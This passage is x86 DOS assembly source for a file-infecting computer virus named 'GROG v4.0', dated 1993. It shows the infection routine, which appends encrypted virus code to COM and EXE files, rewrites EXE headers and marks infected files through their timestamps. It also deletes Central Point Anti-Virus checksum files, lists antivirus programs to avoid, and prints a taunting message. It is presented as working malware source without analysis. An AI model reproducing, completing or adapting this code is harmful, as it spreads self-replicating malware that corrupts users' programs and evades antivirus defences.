            cmp     ax,(code_end-code_begin+100h)
            jb      filesiz_exit    ; Below? Jump to filesiz_exit

            cmp     cs:[com_or_exe],01h ; EXE executable?
            je      dont_test       ; Equal? Jump to dont_test

            cmp     dx,00h      ; Filesize too large?
            jne     filesiz_exit    ; Not equal? Jump to filesiz_exit

            cmp     ax,0fefeh-(code_end-code_begin+18dh)*05h+06h
            ja      filesiz_exit    ; Above? Jump to filesiz_exit
   dont_test:
            pop     dx          ; Load DX from stack

            call    infect_file

            ret             ; Return!
   filesiz_exit:
            pop     ax          ; Load AX from stack (DX)

            ret             ; Return!
            endp

   set_file_sof proc    near        ; Set current file position (SOF)
            xor     al,al       ;  "     "     "      "       "

   set_file_pos proc    near        ; Set current file position
            mov     ah,42h      ;  "     "     "      "
            xor     cx,cx       ; Zero CX
            call    int21_simula

            ret             ; Return!
            endp
            endp

            db      'GROG v4.0 (C) ''93 by GROG - Italy'

   infect_file  proc    near        ; Infect COM/EXE file
            mov     ah,3eh      ; Close file
            call    int21_simula

            mov     ax,4301h        ; Set file attributes
            xor     cx,cx       ; CX = new file attributes
            call    int21_simula
            jc      open_error_     ; Error? Jump to open_error_

            mov     cs:[set_file_att],01h

            mov     ax,3d02h        ; Open file (read/write)
            call    int21_simula
            xchg    ax,bx       ; BX = file handle
            jc      open_error_     ; Error? Jump to open_error_

            push    cs cs       ; Save segments at stack
            pop     ds es       ; Load segments from stack (CS)

            mov     ax,5700h        ; Get file's date and time
            call    int21_simula
            and     cl,11100000b    ; Clear seconds of file time
            or      cl,00010001b    ; Set infection mark (34 seconds)

            push    cx dx       ; Save registers at stack

            jmp     read_file
   open_error_:
            ret             ; Return!
   read_file:
            mov     ah,3fh      ; Read from file
            mov     cx,(code_end-code_begin)
            lea     dx,file_buffer  ; DX = offset of file_buffer
            call    int21_simula

            mov     [com_or_exe],00h    ; COM executable

            cmp     word ptr [file_buffer],'ZM'
            je      infect_exe      ; Found EXE signature? Jump to inf...

            jmp     infect_com
   infect_exe:
            mov     [com_or_exe],01h    ; EXE executable

            mov     word ptr [file_buffer+12h],'ZM'

            lea     si,file_buffer  ; SI = offset of file_buffer
            mov     cx,18h      ; Move eightteen bytes
            lea     di,file_header  ; SI = offset of file_header
   move_header:
            movsb           ; Move file header

            loop    move_header

            xor     dx,dx       ; Zero DX
            mov     al,02h      ; Set current file position (EOF)
            call    set_file_pos

            push    dx          ; Save DX at stack
            mov     dx,word ptr [file_buffer+08h]

            mov     cl,04h      ; Multiply header size in paragrap...
            rol     dx,cl       ; DX = header size
            sub     ax,dx       ; Subtract header size from filesize
            push    ax          ; Save AX at stack
            xor     cx,cx       ; Zero CX
            and     ax,0000000000001111b
            cmp     al,00h      ; Calculate number of bytes in la...?
            je      calc_pages_     ; Equal? Jump to calc_pages_

            neg     al          ; Negate AL
            and     al,00001111b    ; AL = number of bytes to write

            mov     cx,ax       ; CX = number of bytes to write
            mov     ah,40h      ; Write to file
            call    int21_simula

            pop     ax          ; Load AX from stack
            add     ax,cx       ; Add number of bytes actually wri...
            cmp     ax,cx       ; Calculate number of bytes in la...?
            jae     calc_pages      ; Above or equal? Jump to calc_pages

            pop     dx          ; Load DX from stack
            inc     dx          ; Increase DX
            push    dx          ; Save DX at stack
   calc_pages:
            push    ax          ; Save AX at stack
   calc_pages_:
            add     cx,((code_end-code_begin) mod 200h)+200h
            add     word ptr [file_buffer+02h],cx
   test_pages:
            cmp     word ptr [file_buffer+02h],200h
            jb      calc_cs_ip      ; Below? Jump to calc_cs_ip

            inc     word ptr [file_buffer+04h]
            sub     word ptr [file_buffer+02h],200h

            jmp     test_pages
   calc_cs_ip:
            add     word ptr [file_buffer+04h],(code_end-code_begin-200h)/200h

            mov     word ptr [file_buffer+14h],100h

            pop     ax          ; Load AX from stack

            mov     cl,04h      ; Divide by paragraphs
            shr     ax,cl       ; AX = initial SS and CS relative ...
            sub     ax,10h      ; Subtract instruction pointer
            mov     word ptr [file_buffer+16h],ax
            mov     word ptr [file_buffer+0eh],ax

            xor     dx,dx       ; Zero DX

            pop     cx          ; Load CX from stack (DX)
   calc_vir_ptr:
            add     dh,10h      ; Calculate pointer to virus

            loop    calc_vir_ptr

            add     word ptr [file_buffer+16h],dx

            add     dx,100h         ; DX = initial SS relative to star...
            add     word ptr [file_buffer+0eh],dx
            mov     word ptr [file_buffer+10h],1036h

            xor     dx,dx       ; Zero DX
            call    set_file_sof

            mov     cx,18h      ; Write eigthteen bytes
            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     ah,40h      ; Write to file
            call    int21_simula

            xor     dx,dx       ; Zero DX
            mov     al,02h      ; Set current file position (EOF)
            call    set_file_pos

            jmp     get_rnd_num
   infect_com:
            mov     al,02h      ; Set current file position (EOF)
            xor     dx,dx       ; Zero DX
            call    set_file_pos

            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     cx,(code_end-code_begin)
            mov     ah,40h      ; Write to file
            call    int21_simula

            xor     dx,dx       ; Zero DX
            call    set_file_sof
   get_rnd_num:
            mov     ah,2ch      ; Get system time
            call    int21_simula

            add     dh,dl       ; DH = encryption/decryption key
            add     dh,ch       ; DH =       "            "
            add     dh,cl       ; DH =       "            "

            cmp     dh,00h      ; Invalid encryption/decryption key?
            je      get_rnd_num     ; Equal? Jump to get_rnd_num

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,file_buffer  ; DI = offset of file_buffer

            mov     [decrypt_key],dh    ; Store decryption key

            lea     si,code_begin   ; SI = offset of code_begin
            mov     cx,(mov_code_end-code_begin)/02h
   move_code:
            movsb           ; Move hundred and fiftysix byte o...

            loop    move_code

            mov     cx,(crypt_end-crypt_begin)
   encrypt_loop:
            lodsb           ; AL = byte of plain code
            sub     al,dh       ; Encrypt byte
            stosb           ; Store byte of encrypted code
            loop    encrypt_loop

            mov     cx,(code_end-code_begin)
            lea     dx,file_buffer  ; DX = offset of file_buffer
            mov     ah,40h      ; Write to file
            call    int21_simula

            pop     dx cx       ; Load registers from stack
            mov     ax,5701h        ; Set file's date and time
            call    int21_simula

            ret             ; Return!
            endp

   del_chklist  proc    near        ; Delete CHKLIST.CPS
            push    ax dx ds        ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     ah,41h      ; Delete file
            lea     dx,chklist_cps  ; DX = offset of chklist_cps
            call    int21_simula

            pop     ds dx ax        ; Load registers from stack

            ret             ; Return!
            endp

   int21_simula proc    near        ; Simulate interrupt 21h
            pushf           ; Save flags at stack

            call    cs:[int21_addr]

            ret             ; Return!
            endp

   origin_off   dw      terminate-100h  ; Offset of original code of infec...
   terminate:
            int     20h         ; Terminate program

   stdout_str   db      ' Grog v4.0 is here!'
            db      ' HaHaHa!'
   stdout_end:
   int21_addr   dd      ?           ; Address of interrupt 21h
   int13_addr   dd      ?           ; Address of interrupt 13h
   c__command_  db      'C:\COMMAND.'       ; C:\COMMAND.COM
   com_executab db      'COM',00h           ; COM executable
   exe_executab db      'EXE',00h           ; EXE executable
   file_specifi db      '*.*',00h           ; File specification
   com_or_exe   db     00h          ; COM or EXE executable
   set_file_att db     00h          ; Set file attributes
   table_begin  db      'MBIO'              ; IBMBIO.COM
            db      'MDOS'              ; IBMDOS.COM
            db      'SCAN  '            ; McAfee ViruScan
            db      'CLEAN '            ;   "       "
            db      'F-PROT'            ; F-PROT
            db      'CPAV  '            ; Central Point Anti-Virus
   table_end:
   chklist_cps  db      'CHKLIST.CPS',00h   ; Central Point Anti-Virus CRC fil...
   file_header  db      18h dup(?)      ; EXE header
   file_buffer:
            db      18h dup(?)
   int01_addr   dd      ?           ; Address of interrupt 01h
   crypt_end:
   code_end:
            db      0d58dh dup(?)
   dta:
            db      15h dup(?)      ; Used by DOS for find next-process
   file_attr    db      ?           ; File attribute
   file_time    dw      ?           ; File time
   file_date    dw      ?           ; File date
   filesize     dd      ?           ; Filesize
   filename     db      0dh dup(?)      ; Filename
   data_end:

   end      code_begin
